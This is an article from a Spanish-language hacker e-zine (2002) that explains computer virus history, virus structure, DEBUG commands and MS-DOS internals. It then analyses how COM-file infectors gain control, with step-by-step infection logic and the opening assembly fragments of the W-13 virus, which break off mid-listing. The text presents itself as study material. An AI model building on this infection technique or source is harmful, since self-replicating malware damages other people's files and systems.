      ## #######   ####### #######      ####### ### ######## ######## ##      
      ## ########  ####### #######      ####### ### ######## ######## ##      
     ##      ##### ####### #######      ####### ### #### ### ########  ##     
     ##        ###                                  ###  ###           ###    
    ###  ###   ###   ###   #######  ###    ###  ### ###   ## ########  #####  
  #####  ###   ###   ###   #######  ###   ###   ### ###   ## ########  #####  
  #####  ###   ###   ###   #######        ###   ### ###   ## ########  ### #  
  # ###  ###  ####   ###   ###           ###  # ### ###   ## ###       ##  #  
  #  ##  ########   #####  ###           ###  # ### ###   ## ########  ##  #  
  #  ##  #######    #####  ###          ####### ### ###   ## ######## ##   #  
  #   ## ######     #####  ###          ####### ### ###   ## ######## ##   #  
  #   ##                                                                   #  
  #              ############################################              #  
  #             ##  DTFzine issue #3    Mayo'02             ##             #  
  #             #   TiTuLo: Virus y otras hierbas            #             #  
  ###############   Autor : R2000                            ###############  
    #############   Email : raiders@mexico.com               #############    
                 ##  Web   : http://www.dtfzine.cjb.net     ##               
                  ###########################################               
                   ######################################### 
  
  El término  virus  procede  de  su  comportamiento  análogo  con  un  virus
 biológico,  este  vocablo  proviene  de  la  palabra  usada  en  latín  para
 denominar  el veneno. Muy recientemente se le asignó el nombre científico de
 SRA (Self Reproducing Automaton), esto es  un autómata que se reproduce a sí
 mismo.

  El primer  uso  del  término  virus  fue en  1972 y se debe a una novela de
 ciencia ficción llamada : "When Harley was one" escrita por  David  Gerrold.
 Fred Cohen en 1983 define formalmente en  un  trabajo  de  tesis doctoral el
 término virus de computadora, ademá s escribe  uno de los primeros códigos y
 el Dr. Len Ademal (su asesor de  tesis) le  sugiere  que  lo  llame  de  esa
 manera; de aquí en adelante los  virus han  sido  escritos para muchos tipos
 de ambientes computacionales tales como MS-DOS, OS/2, AMIGA, etc.

  Otro programa  que  ofrece  un  comportamiento  similar a un virus pero que
 muchos autores lo tratan de manera distinta es  el gusano (worm), estos  son
 programas que pueden ejecutarse independientemente  y  viajar de una máquina
 a otra en conexiones de la red (un ejemplo de esto  es  el  famoso gusano de
 Internet); los  gusanos  no  pueden  cambiar  otros  programas aunque pueden
 llevar código adicional  que  realice  esta  función, tal  como un verdadero
 virus.

  Abarcando la historia del surgimiento  de  los virus de computadora basados
 en el sistema operativo  MS-DOS la  historia nos  refiere  a 1986 cuando  en
 Pakistán es creado  el  virus "Brain"  por Basit  y Amjad, que  más adelante
 comercializaron la vacuna, y sólo infectaban  el sector  de arranque  de los
 discos de 360k.

  Al mismo tiempo Ralph Burger creaba  un  programa que tenía la propiedad de
 realizar copias de si mismo en otros archivos, y lo  llamó  VIRDEM, que  fue
 distribuido  en  una  conferencia  del  Chaos Computer Club en diciembre del
 mismo año; en 1987 surge  el primer virus polimórfico conocido como Camaleón
 que complicó el problema de eliminación de virus  de  computadora, basado en
 el virus viena que habia sido publicado tiempo antes por Burger en un libro.

  Poco  a  poco  los  creadores  de  virus  de  computadora  fueron mejorando
 notablemente sus programas, hasta consegui  virus  muy  sofisticados (Natas,
 Hare Krishna,etc.) que emplean  técnicas  que  dificultan  su  estudio y por
 tanto su detección. El futuro que  se nos  presenta  no  es   muy  alagador,
 porque diariamente  aparecen  una  gran  cantidad  de  virus  que  han  sido
 "mejorados" para ocultarse  de  los "scanners" y poder  tener así una amplia
 gama de propagación.

 II ESTRUCTURA BÁSICA

  Un virus de computadora debe tener 2 partes básicas, o subrutinas, si desea
 ser considerado como tal (algunos autores como  Spafford, describen un virus
 de  otra   manera,  pero  su  descripción   es   meramente  para  propósitos
 conceptuales).

  Primeramente, deberá contener una "rutina de búsqueda"  que localiza nuevos
 archivos o nuevas áreas de  disco  que valen la pena infectarse. Esta rutina
 también determina cual es la mejor forma de reproducirse, ya sea que infecte
 múltiples discos, uno solo, que pueda infectar cualquier porción del disco o
 áreas específicas; mientras  más  sofisticadas sean las rutinas de búsqueda,
 tomará mayor espacio.

  La segunda rutina es la que se refiere a  la  capacidad  de  infección  que
 tiene para instalarse en una computadora  huésped; la  rutina  de  copia tan
 solo se especializa  en  este  trabajo  y  mientras más pequeña sea es mucho
 mejor, pero depende de la complejidad con que un virus se copie dentro de un
 archivo huésped; por  ejemplo, un virus que infecte solo archivos COM tendrá
 una rutina de copia  mucho  menor  que  un archivo que infecte archivos EXE,
 esto, por la diferencia de estructura entre un archivo y otro.

  Mientras  un  virus  solo  necesita   las   2  rutinas  antes  mencionadas,
 generalmente van acompañadas de  rutinas  para  evitar  ser  detectados  con
 facilidad por  programas  antivirus (o por  el  usuario) y pueden  funcionar
 junto con las  rutinas  de búsqueda  y copia o funcionar de manera separada;
 las rutinas de antidetección pueden  ir desde eliminar los repetidos accesos
 a disco (que despertarían sospechas en los usuarios), hasta el "transformar"
 su código para hacer más difícil su identificación.

  Además de  las  rutinas  antes  mencionadas, a  muchos  virus los acompañan
 rutinas que destruyen información o muestran mensajes curiosos.

	[Imagen: imagenes/partes.gif]

 III Nociones Básicas de Ensamblador

  - Comandos de Debug:
    ------------------

  Debug (depurador) es un programa de utilidad que provee un medio controlado
 de prueba para  archivos  objeto  binarios  y  ejecutables, que  elimina  la
 necesidad de reensamblar un programa para ver si un problema se ha arreglado
 con un cambio menor. Además, permite alterar el contenido de un archivo o el
 contenido de un  registro  de  la  CPU e inmediatamente volver a ejecutar un
 programa para verificar la validez de los cambios realizados.

  Existen dos métodos para iniciar debug:

  1] Teclear  debug. Inmediatamente  después  aparecerá  en  la  pantalla  un
 guión(-), indicando que está listo para ejecutar sus comandos.

  2] Arranque desde una línea de comando: Utiliza la Sintaxis:

       debug [nombre del archivo [lista de argumentos]]

    Parámetros de comandos Debug

  Todos  los  comandos  del  debug  aceptan  parámetros  excepto el comando Q
 (Salir). Los parámetros pueden estar separados por delimitadores (espacios o
 comas)  y  si  se  requiere  únicamente   entre  dos  valores  hexadecimales
 consecutivos.

  Parámetro                               Definición
  unidad                  Un valor hexadecimal indica la unidad desde la cual
                          el archivo será escrito.

                          Las equivalencias se asignan como sigue:
				Valor hexadecimal		Drive
					0			   A
					1			   B
					2			   C
					3			   D
  byte                    Valor  hexadecimal  de 1 a 3 dígitos puesto o leído
                          desde una dirección o registro.


  Parámetro                                Definición
  registro                Valor hexadecimal de 1 a 3  dígitos  que  indica el
                          número de  registro  lógico en el disco y el número
                          de sectores del disco  a ser  escritos  o  cargados
  valor                   Un  valor  hexadecimal   hasta  de  4  dígitos  que
                          especifica un número de puerto o el número de veces
                          que  un   comando   debe   repetir   sus  funciones
  dir                     designación de dos partes que  contiene un registro
                          de segmento alfabético o una dirección
  rango                   Contiene dos direcciones
                          dir dir o dir Lvalor donde valor es el # de líneas
                          sobre las que el comando debe operar.

 INSTRUCCIONES DE DEBUG

 A       (Assemble : ensamblar)
         Propósito: ensambla mnemónicos  del 8086/8087/8088 directamente a la
         memoria
         Sintaxis :   A[dirección]

 C       (Compare : comparar)
         Propósito: compara la porción de memoria  especificada por rango con
         una porción del mismo tamaño comenzando en la dirección especificada
         Sintaxis :   Crango dirección

 D       (Dump : vaciar)
         Propósito:  muestra   el  contenido   del   rango   de   la  memoria
         especificado.
         Sintaxis :   D[rango]

 E       (Enter : entrar)
         Propósito:  entra valores de tipo byte en la memoria en la dirección
         especificada.
         Sintaxis :    Edirección[lista]

 F       (Fill : inicializar)
         Propósito: inicializa las direcciones en el rango  especificado  con
         los valores en la lista especificada
         Sintaxis :   Frango lista

 G       (Go : ejecutar)
         Propósito: ejecuta el programa que se  encuentra  actualmente  en la
         memoria
         Sintaxis:    G[=dirección  [direcciones]]
    
 H       (Hex : Hexadecimal)
         Propósito: realiza operaciones aritméticas hexadecimales  sobre  los
         dos parámetros especificados
         Sintaxis: H valor valor

 I       (Input : entrada)
         Propósito: entra y muestra un byte desde el puerto  especificado por
         valor
         Sintaxis :   Ivalor

 L       (Load : cargar)
         Propósito: carga un archivo en la memoria
         Sintaxis :   L[dirección[unidad:registro registro]]

 M       (Move : mover)
         Propósito: mueve el bloque de memoria especificado  por  rango  a la
         localización a partir de la dirección especificada.
         Sintaxis :   Mrango dirección

 N       (Name : nombre)
         Propósito: establece nombres de archivo
         Sintaxis :   Nnom_archivo[nom_archivo]

 O       (Output : salida)
         Propósito: envía  el  byte  especificado   al   puerto   de   salida
         especificado por valor
         Sintaxis :   Ovalor byte
     
 Q       (Quit : salir)
         Propósito: Termina la utilidad debug
         Sintaxis :   Q

 R       (Register : registros)
         Propósito: Muestra el contenido de uno o más registros de la CPU
         Sintaxis :   R[nombre del registro]

 S       (Search : buscar)
         Propósito: busca  en  el  rango   especificado  la  lista  de  bytes
         especificada
         Sintaxis :   Srango lista

 T       (Trace : monitoreo)
         Propósito: ejecuta una instrucción y muestra  el  contenido de todos
         los registros, banderas y la instrucción decodificada
         Sintaxis : T[=dirección][valor]

 U       (Unassemble : desensamblar)
         Propósito: desensambla bytes y muestra las  instrucciones fuente que
         corresponden a ellos, con las direcciones y los valores de bytes

 W       (Write : escribir)
         Propósito: escribe el archivo que está siendo depurado al archivo en
         disco
         Sintaxis :   W[dirección[unidad:registro registro]]

 IV Estructura de MS-DOS

  MS-DOS (Microsoft Disk Operating  System) es  desarrollado  en 1980, cuando
 IBM inicia la búsqueda de un sistema  operativo  para su  computadora IBM PC
 basado en el procesador 8086.

  DOS  existe  como  una  interface  de "alto  nivel" entre  un  programa  de
 aplicación y la computadora; permite el manejo  de memoria, E/S de todos los
 dispositivos así como las operaciones de disco. Contiene  además  de algunos
 programas de "control" y un conjunto de programas de "utilerías".

  Proceso de carga de MS-DOS : Cuando una PC  es encendida, el CPU ejecuta la
 primera instrucción  en  la  localidad de  memoria F000:FFF0. El sistema ROM
 BIOS (Read Only  Memory-Basic Input  Output System) está  localizado en esta
 parte de memoria alta, de  esta  forma es el  primer  código que  ejecuta la
 computadora. Este código está escrito en lenguaje ensamblador y se encuentra
 almacenado en circuitos integrados (EPROMS) dentro de la computadora.
 Típicamente este código  permite  la  ejecución  de las funciones necesarias
 para iniciar la computadora y permitir su correcto funcionamiento. En primer
 lugar se realiza una  verificación  del hardware para saber que dispositivos
 están  disponibles (por ejemplo, monitor a color o monocromático); la rutina
 más familiar de esta revisión es el test de memoria. Al terminar su revisión
 de hardware, el  código ROM, inicializa  la  tabla  de interrupciones en los
 primeros 1024 bytes de memoria  baja. Esta  tabla  provee las entradas a los
 vectores  de  interrupción  para  que  sean  utilizadas por los programas de
 aplicación, además inicializa el  área de  datos  en la localidad de memoria
 0040:0000H (aquí se  encuentra  un  byte  específico  de  configuración  del
 equipo). Cuando lo anterior  se completa, el  BIOS está  listo para ceder el
 control al sistema operativo en disco.

  El sector de boot es un valioso paso intermedio en  el proceso de carga del
 sistema operativo y trabaja como a continuación se explica:

  El BIOS ignora el sistema operativo que se cargará en memoria. Sin embargo,
 conoce la primera unidad de disco y trata de leer el primer sector del disco
 (track 0, cabeza 0, sector 1) en la localidad de memoria 0000:7C00H; una vez
 que el bootsector ha sido  leído  en  memoria, el  BIOS  checa los 2 últimos
 bytes y si localiza los  valores  55H  AAH  le indicaría que es un sector de
 BOOT válido y transfiere el control  a  la  dirección 0000:7C00H. Desde este
 punto, el bootsector es el responsable  de  cargar  el  sistema operativo en
 memoria.

  Generalmente, un boot está diseñado para cargar otro archivo  más  grande o
 un grupo de sectores  del  disco  y  le  pasa  el  control; bajo  MS-DOS los
 archivos que son cargados y ejecutados son : IO.SYS y MSDOS.SYS.

  Cuando un boot normal de  DOS  se  ejecuta, determina, en primer lugar, los
 parámetros del disco; después verifica  que  los  2  archivos mencionados se
 encuentren en el disco. De no estar presentes envía  un mensaje  de  error y
 detiene el proceso de arranque, de lo contrario, el  boot trata de cargar el
 IO.SYS en la localidad de memoria 0000:0700H.

  DOS consiste básicamente de cuatro componentes :

  El "Boot Record" : Se  encuentra  en el  track 0, sector 1, lado  0 de cada
 disco  formateado  por  el  comando  format de  DOS. El boot record contiene
 información relativa a cada  disco y  es el  encargado  de cargar el sistema
 operativo de disco.

  Interfase ROM BIOS :  El archivo IO.SYS es  el módulo  de interfase para el
 ROM BIOS,  provee  servicios  de  bajo  nivel  para  las   rutinas   de  los
 dispositivos. Estas   rutinas   incluyen   instrucciones    para   desplegar
 información en la  pantalla, leer  del  teclado, enviar  datos a los puertos
 paralelo y serial. Además de leer el archivo CONFIG.SYS e instalar cualquier
 manejador de dispositivo o configuración adicional contenidos en este él.
	
  Archivo de programa de DOS : El archivo MSDOS.SYS brind a una  interfase de
 alto nivel para los programas de aplicación. Consiste de  rutinas  de manejo
 de archivos, lectura y escritura  de  bloques  de datos  para las rutinas de
 disco, y una variedad de funciones  preconstruídas  de fácil acceso para los
 programas del usuario.

  Procesador de comandos : El interprete  de  comandos, mejor  conocido  como
 COMMAND.COM, es la parte  interactiva  entre  la  computadora  y el usuario;
 consiste de tres partes, a las  que IBM  llamó "porción residente", "porción
 de inicialización" y "porción transitiva".

  La porción residente contiene rutinas  para procesar las interrupciones 22h
 (dirección  de  terminación), 23h   (Manejador   de   CTRL-Break) y  la  24h
 (Controlador de error crítico), además de una rutina para  cargar y ejecutar
 comandos externos. Cuando un programa termina, un checksum es utilizado para
 determinar si la parte  transitiva  debe  ser  cargada,  porque  esta última
 contiene los comando internos, que cuando  se  ejecuta  alguna aplicación no
 son utilizados.

  DTA : Para cualquier operación que involucre el  manejo de archivos, MS-DOS
 crea un área de memoria, conocida como DTA, para  la  entrada  y  salida  de
 información desde y hacia los archivos  en  disco. Sólo  una  DTA  puede ser
 usada cada vez. Al usar funciones de  DOS  que  utilizan control de archivos
 (no emplean la DTA como buffer para transferir  datos  como  con el FCB), la
 DTA contiene datos relativos al archivo.

  Al terminar el acceso a un archivo por medio de  las  funciones  de control
 de archivos, la DTA tiene el siguiente estructura:

          Desplazamiento  Tamaño          Descripción

          0               21 bytes        Reservado por MS-DOS
          15h             1 byte          Atributo de archivo
          16h             2 bytes         Hora de creación de archivo
          18h             2 bytes         Fecha de creación de archivo
          1Ah             4 bytes         Tamaño del archivo
          1Eh             12 bytes        Nombre y extensión de archivo

  PSP: Cuando un programa es  cargado  en  memoria  para  ser  ejecutado, DOS
 construye un bloque de memoria de 256 bytes, conocido  como  PSP (que es una
 herencia del sistema operativo CP/M) el cual  contiene  información sobre el
 sistema.

  La siguiente tabla corresponde el formato que guardan los datos almacenados
 en el Prefijo de Segmento de Programa (PSP).

	00h	2 Bytes 	Llamada a Interrupción 20H.
	02h 	1 Palabra	Dirección de Segmento Asignado al  Programa           
	04h 	1 Byte		Reservado.
	05h	5 Bytes	        Llamada a Interrupción 21H. (llamadas lejanas
                                al despachador de Ms Dos, estilo CP/M).
	0Ah	2 Palabras	Copia del Vector de Interrupción 22H.          
        0EH     2 Palabras      Copia del Vector de Interrupción 23H.(Ctrl C)
        12H     2 Palabras      Copia del Vector de Interrupción 24H.(error
                                critico)
	16H	2 Bytes 	Parent ID.
	18H	20 Bytes	Tabla de manejadores.
 	2CH	1 Palabra	Dirección de Segmento de Bloque de Entorno.
	2EH	4  Bytes	Stack del usuario.
	32H	2  Bytes 	Contador de manejadores de archivo.
	34H	4  Bytes	Tabla de dirección de manejadores.
	38H	24 Bytes	Reservado.
	50H	3  Bytes	Llamada a Ms Dos y Ret.
	53H	9  Bytes	Reservado.
	5CH     16 Bytes	Bloque de control de archivo FCB 1.
  	6CH     16 Bytes	Bloque de control de archivo FCB 2.
	80H	1 Byte		Número de caracteres en Línea de Comandos.
	81H	127 Bytes	Línea de Comandos (Termina con CR).
				(Area De transferencia a Disco por Default
                                DTA).

  Manejo de archivos:

  Existen  dos  formas  básicas  para  el  manejo de archivos en  MS-DOS, por
 medio  de  FCB's (File Control Block) y por controles de  archivo. El uso de
 FCB's no es muy común entre  los virus de computadora, consiste en un bloque
 de memoria  para  manejar  los  accesos  a  los  archivos; solo  pueden  ser
 accesados  archivos  en  el directorio actual, y debe ser creado un FCB para
 cada archivo que se utlice.

  Las funciones  básicas proporcionadas por MS-DOS para el manejo de archivos
 por medio de los FCB's son:

	0Fh Abrir archivo
	10h Cerrar archivo
	11h Buscar primera coincidencia
	12h Buscar siguiente coincidencia
	13h Borrar archivo
	14h Leer archivo secuencial
	15h Escribir archivo secuencial
	16h Crear Archivo
	17h Renombrar archivo

  La estructura de un FCB es como a continuación se explica:

        Desplazamiento  Tamaño          Descripción

	00		1 byte		Número de unidad 0 = por omisión,
                                        1 = A, 2 = B, etc.
	01		8 bytes		Nombre de archivo
	09		3 bytes		Extensión de archivo
	0C		2 bytes		Número de bloque actual
	0E		2 bytes		Tamaño de bloque
	10		4 bytes		Tamaño de archivo
	14		2 bytes		Fecha de archivo
	16		2 bytes		Hora de archivo
	18		8 bytes 	Reservado
	20		1 byte		Número de registro actual
	21		4 bytes		Número de registro aleatorio

  A diferencia del manejo de archivos por FCB's, el manejo  de  archivos  por
 medio de control de archivos es el recomendado, no está  restringido al  uso
 de archivos en el subdirectorio actual,  y no es  necesario tener algún área
 específica para el intercambio de información con los archivos.


  Las funciones básicas proporcionadas por MS-DOS  para el manejo de archivos
 por medio de los control de archivo son:

	3Ch Crear/Truncar archivo
	3Dh Abrir archivo
	3Eh Cerrar archivo
	3Fh Leer archivo
	40h Escribir a archivo
	41h Borrar archivo
	42h Mover apuntador de archivo
	43h Obtener/establecer atributos de archivo
	4Eh Buscar primera coincidencia
	4Fh Buscar segunda coincidencia

  Cuando un programa es abierto por  medio  de  control  de  archivos, le  es
 asignado un número con el que se hace referencia a él durante cualquier otra
 actividad que lo involucre.

 Interrupciones:

  Las interrupciones están basadas en las necesidades de  compartir  recursos
 con el procesador (dispositivos de entrada / salida, teclado ratón, etc.)

  Una interrupción es una operación que suspende temporalmente  la  ejecución
 de un  programa  mientras  el  sistema  realiza  una  acción  específica. En
 realidad, la  instrucción  INT o  Interrupción  puede  compararse al trabajo
 realizado por la instrucción CALL cuando  se  llama  a  una  rutina de algún
 programa, pero la computadora se encarga  de localizarla mediante un vector.

  Tipos de interrupciones:

  Básicamente las interrupciones se dividen en 2 tipos:

  - Interrupciones de Software :

  Una interrupción de software es la que hace  posible  el  uso  de  diversas
 rutinas básicas  del  sistema. Dentro  de  las  interrupciones  de  software
 podemos encontrar  las  interrupciones  del  sistema  ( DOS  y  BIOS ) y las
 interrupciones de Usuario.

  - Interrupciones de Hardware  :

  Por lo general las interrupciones de hardware detectan  fallas  o anomalías
 en el  sistema,  clasificadores en internas y externas.

  Externas :  Este  tipo  de   interrupción  es  denominada  Interrupción  de
 Hardware Externa porque es  puesta  en  funcionamiento  por  un  dispositivo
 externo (Por ejemplo el teclado "Int 9"), subdividiendose en enmascarables y
 no enmascarables :

  Enmascarables: Estas interrupciones pueden ser desactivadas (enmascarables)
 por  medio  de  la  instrucción  STI  (SeT  Interrupt  flag)  del   Lenguaje 
 Ensamblador,  volviendo   a   ser   activadas   por   la   instrucción   CLI
 (Clear Interrupt flag); por ejemplo la interrupción 9.

  No-Enmascarables : Las  interrupciones   de   este   tipo   no  pueden  ser
 deshabilitadas por   la   instrucción   STI;  por  ejemplo  la  interrupción
 2 que indica algún error en la memoria de la computadora.

   Tabla de interrupciones:

  Cada interrupción tiene asociada  una "rutina de interrupción" que controla
 una  condición  particular;  para  organizar  las  interrupciones, cuando el
 sistema se inicializa, se ubica en  los  primeros  1024 bytes de memoria una
 tabla que contiene las direcciones para las diferentes interrupciones.

  La tabla se compone por grupos de 4 bytes que contienen  la dirección de la
 rutina de interrupción a ejecutar; esta dirección se encuentra conformada de
 la siguiente manera: Los 2  primeros  bytes  corresponden  al offset y los 2
 últimos al segmento.

  Cuando una interrupción es generada, el  CPU toma el número correspondiente
 a la interrupción, lo multiplica por 4 y el resultado lo toma como un índice
 a la tabla de  interrupciones, toma  los  4  bytes que se  encuentran en esa
 localidad y pasa el control a la dirección apuntada por dichos bytes.

  Una de las ventajas de utilizar la tabla de vectores de  interrupción es el
 de poder cambiar fácilmente una dirección en la tabla y colocar la dirección
 de una interrupción del usuario; esto hace  posible que  una nueva rutina de
 interrupción  pueda   ser   invocada   por   cualquier  programa simplemente
 ejecutando la instrucción de interrupción correspondiente.

  Area de datos de MS DOS y ROM BIOS
  ----------------------------------

  El área de ROM BIOS inicia en la  localidad  de  memoria  absoluta  000400,
 dónde se encuentran diferentes bytes de información, un ejemplo de ellos son
 los bytes localizados en las siguientes direcciones.

  Dirección       Tamaño          Descripción.
  0000:0400       8 bytes         4 palabras que  representan cada una de las
                                  cuatro  tarjetas  (RS-232) que  pueden  ser
                                  instaladas.

  0000:0408       8 bytes         Lo  mismo   solo   que   para  los  puertos
                                  paralelos.

  0000:0410       2 bytes         Es la bandera  de  equipo; parte baja datos
                                  de  los  interruptores,  y  alta  el  #  de
                                  puertos.

  0000:0413       2 bytes         Capacidad de memoria de la PC en kilobytes.

  0000:0417       1 byte          Estado que guardan varias teclas
                                  bit 0 = tecla "Shift" derecho se oprimió
                                  bit 1 = tecla "Shift" izquierdo se oprimió
                                  bit 2 = tecla "Control" se oprimió
                                  bit 3 = tecla "Alt" se oprimió
                                  bit 4 = tecla "Scroll Lock" esta oprimida
                                  bit 5 = tecla "Num Lock" esta oprimida
                                  bit 6 = tecla "Caps Lock" esta oprimida
                                  bit 7 = tecla "Ins" esta oprimida
  0000:0418       1 byte          Estado que guardan algunas teclas o
                                  combinaciones.
                                  bit 0 = tecla "Ctrl" esta oprimida
                                  bit 1 = tecla "Alt" esta oprimida
                                  bit 2 = tecla "SysReq" esta oprimida
                                  bit 3 = tecla "Pause" esta oprimida
                                  bit 4 = tecla "Break" esta oprimida
                                  bit 5 = tecla "Num Lock" esta oprimida
                                  bit 6 = tecla "Caps Lock" esta oprimida
                                  bit 7 = "Ins" esta oprimida

  0000:0419       1 byte          Se acciono la combinación de  teclas "Alt"+
                                  teclas del cursor> para producir caracteres
                                  ascii.

  0000:041A       2 bytes         Apuntador a la  cabeza  del  área  de  paso
                                  (Buffer)  del  teclado. Siguiente  carácter
                                  que se lee en el teclado.

  0000:041C       2 bytes         Apuntador  a  la  cola   del  área  de paso
                                  (Buffer) del teclado. Ultimo  carácter  que
                                  se lee del teclado.

  0000:041E       32              Bytes buffer del teclado = a 16 caracteres.

  0000:043E       1 byte          Los primeros  4 bits  indican  el numero de
                                  drives conectados a la PC (4 drives), y los
                                  demás indican si deben ser calibrados.

  0000:043F       1 byte          Lo primeros 4 bits indican si  el motor del
                                  drive se encuentran encendidos, el bit 7 se
                                  enciende  cuando  se  esta  escribiendo  al
                                  disco.

  0000:0440       1 byte          Indica el periodo  de  tiempo en el cual se
                                  apaga el motor del disco.

  0000:0441       1 byte          Contiene el  estado  del último  acceso  al
                                  disco, 0 indica no error en acceso.

  0000:0442       6 bytes         Indican el estado del controlador de discos
                                  floppys y duros.

  0000:0449       1 byte          modo del video (CRT)

                                  bit 0 = 40x25 blanco y negro
                                  bit 1 = "   " color
                                  bit 2 = 80x25 blanco y negro
                                  bit 3 = "   " color
                                  bit 4 = 320x200 color
                                  bit 5 = "     " blanco y negro
                                  bit 6 = 640x200 "            "
                                  bit 7 = monocromático

  0000:044A       2 bytes         Número de columnas  según  modo  de  video.
  0000:044C       2 bytes         Tamaño del buffer de video.
  0000:044E       2 bytes         Contiene la  dirección de  la página actual
                                  en el monitor, usualmente contiene 1000h.

  0000:0450       16 bytes        Ubicación del cursor para cada una de las 8
                                  páginas (pantallas) de despliegue,
                                  reservado 2 bytes para línea y columna del
                                  cursor.

  0000:0460       1 byte          Contiene el inicio de línea para el cursor.

  0000:0461       1 byte          Contiene el final de línea para el cursor.

  0000:0462       1 byte          Número de la página de despliegue activa.

  0000:0463       2 bytes         Contiene la dirección del puerto de la
                                  tarjeta de video instalada.

  0000:0465       1 byte          Modo de video según la tarjeta instalada.

  0000:0466       1 byte          Contiene el color actual de la paleta.

  0000:0467       5 bytes         Extensiones del casette
  0000:046C       2 bytes         parte alta del temporarizador (Timer).

  0000:046E       2 bytes         "   " baja "   "            "  "    "

  0000:0470       1 byte          Contiene un 0 mientras el contador de la
                                  rutina no exceda las 24 horas.

  0000:0471       1 byte          Indica la interrupción por el teclado vía
                                  Ctrl C o Ctrl Break. el bit 7 indica.

  0000:0472       2 bytes         Bandera que indica el tipo de
                                  reinicialización (Post o Warm), se produce
                                  un arranque en caliente cuando esta palabra
                                  es igual a 1234h.

  0000:0474       4 bytes         Estado del disco rígido y controlador. XT

  0000:0478       4 bytes         Contienen el estado de los puertos
                                  paralelos.

  0000:047C       4 bytes         " " " " " " " " " seriales.

  0000:0480       2 bytes         Dirección del desplazamiento del área de
                                  paso del teclado. Normalmente 0040:001E.

  0000:0482       2 bytes         Dirección del desplazamiento del área de
                                  paso del teclado. Normalmente 0040:003E.

  0000:0488       1 byte          Contiene la última rapidez de transmisión
                                  AT de datos del floppy o disco duro.

  0000:048C       10 bytes        Contiene variables necesarias para el
                                  acceso a floppy o disco duro.

  0000:0497       1 byte          Estado del teclado (LED)

  0000:0500       N/A             Area destinada al directorio del disco.

  0000:0700       N/A             Algunos mensajes de Ms Dos.

  0000:0800       N/A             Manejadores de dispositivos.

  0100:0000       N/A             Copyright de Ms Dos.

  3F05:0000       N/A             Tabla de mensajes de Ms Dos.

  3F4E:0000       N/A             Tabla de comandos internos.

  3F60:0000       N/A             Ultimo comando que se introdujo.

  B000:0000       4000            Memoria de video monocromático.

  B800:0000       4000            Memoria de video color.

  F000:6000       N/A             Interprete de Basic.

  F000:E000       N/A             Programa principal de BIOS.

  F000:FFF0       N/A             Fecha y versión del BIOS.

  F000:FFFE       N/A             Tipo de PC.
                                  252 o FCH = AT
                                  254 o FEH = XT o portable PC
                                  255 o FFH = PC
  F000:FFFF   N/A                 Extensiones de BIOS.

 V Estudio de un virus representativo

  Para entender como un virus se copia a sí  mismo  de  un  archivo  a  otro,
 debemos escarbar dentro de algunos detalles del  funcionamiento  del Sistema
 Operativo. DOS carga un programa en  memoria y  le pasa el control. El virus
 deberá ser capaz de tomar el control y de esta forma poder reproducirse.

  Cuando se  ingresa  un  nombre  de  programa en el prompt del DOS, comienza
 buscando por archivos de extensión "COM". Si  encuentra  uno que corresponda
 al nombre que se desea  lo  carga  y  lo ejecuta. De otra forma busca por un
 archivo con extensión "EXE" y finalmente por un archivo con extensión "BAT";
 de no encontrar ninguno, DOS despliega el mensaje de error "Comando o nombre
 de archivo incorrecto".

  Para  ejecutar  un  archivo, DOS  verifica, en  primer  lugar,  que  exista
 suficiente memoria para  cargarlo  y  le  asigna  la  memoria  que  necesita,
 después de esto DOS  construye  un  bloque de  memoria de 256 bytes conocido
 como PSP (Prefijo de Segmento de Programa) que  es  un remanente del sistema
 operativo  CP/M  (Control  Program  For  Microprocessor) muy  popular en los
 sistemas basados en procesadores 8080 y Z80.

  Una vez que el PSP es construido, DOS toma el archivo COM en el  disco y lo
 "carga" en memoria justo abajo del PSP, empezando  en el  desplazamiento 100
 hexadecimal pasando el control a esta dirección.

 GANANDO EL CONTROL

  Para ganar el control al inicio, un virus que infecte un archivo COM deberá
 reemplazar algunos bytes del inicio del programa COM con un salto  al código
 del virus, el cual fue anexado al  final  del programa huésped. Es entonces,
 cuando el programa ejecutado,  brinca  al  virus,  el  cual  busca  por  más
 archivos  y los infecta. Cuando  el  virus  esta  listo, puede  regresar  el
 control al programa anfitrión. Esto lo hace guardando en su  área  de  datos
 los bytes originales del programa huésped.

	[Imagen:imagenes/infeccion.gif]

  En resumen, un virus que actúa en archivos COM, realiza lo siguiente:

  1.- Un archivo COM infectado es cargado en memoria y  ejecutado. El  código
  viral toma primero el control.

  2.- El virus en memoria, busca en el  disco  un archivo  COM para infectar.

  3.- Si lo encuentra, procede a su infección anexando  su  código  al final.

  4.- Lee algunos de los primeros bytes del archivo en memoria y los  escribe
  en su área de  datos. El  nuevo  virus  necesita  estos  bytes  para  poder
  ejecutar el programa original.

  5.- El virus escribe una instrucción de salto en el  comienzo  del  archivo
  huésped que se está infectando, la cual pasa  el  control  al  nuevo  virus
  cuando el programa anfitrión es ejecutado.

  6.- El virus en memoria, toma los  bytes  originales  de su área de datos y
  los coloca en su lugar original (100H).

  7.- Finalmente, el código viral brinca al desplazamiento 100 Hexadecimal  y
  permite al programa ejecutarse.

	Estudio de un virus en particular

  El virus analizado a continuación es conocido  como "W-13"; se  caracteriza
 por ser un virus infector de archivos  COM, tiene  semejanza  con  el  virus
 Vienna, pero marca a los archivos que infecta colocando un 13 en el campo de
 mes de la fecha  del  archivo. Se  reporta  que  es  originario  de  Rusia o
 Polonia.

  El código que aquí se presenta es  con  fines  ilustrativos  y  de estudio,
 siendo responsabilidad de cada uno utilizarlo de manera adecuada.

  Podemos dividir el código para su estudio en:

  1) Regresando el Control: El  virus  coloca  los  3  bytes  originales  del
 archivo huésped en la dirección C S:100  para  que  el  programa  pueda  ser
 ejecutado.

 VIRUS:
                PUSH   AX
                MOV    SI,OFFSET DATOS   ;Dirección donde se encuentran los 3
					 ;bytes originales
                MOV    DX,SI             ;Poner DX en los datos para ponerlos
                                         ;en su lugar original en memoria
                CLD                      ;Limpia la bandera de dirección
                MOV    CX,3              ;Número de bytes que se van a mover
                MOV    DI,100H           ;Dirección donde se pondrán
                                         ;?(Bytes Originales)
                REP    MOVSB             ;Repite mientras cx>0 Mueve [si] a
ES:[di]

  2) Búsqueda :  El virus busca  un  archivo  cada  vez  que  sea  ejecutado,
 verificando que se cumplan ciertas condiciones para poder infectarlo:

  i) Que sea un archivo COM.
  ii) Que no haya sido infectado previamente (13 en el campo de mes).
  iii) Que su tamaño sea menor de 64 K y mayor de 256 bytes.

 FIND1:
                MOV   CX,3                ;Atributo a usar en la búsqueda
                MOV   AH,4EH              ;Servicio de Búsqueda de primera
                INT   21H                 ;Coincidencia con el nombre en DS:DX
                                          ;Y coloca la información el DTA
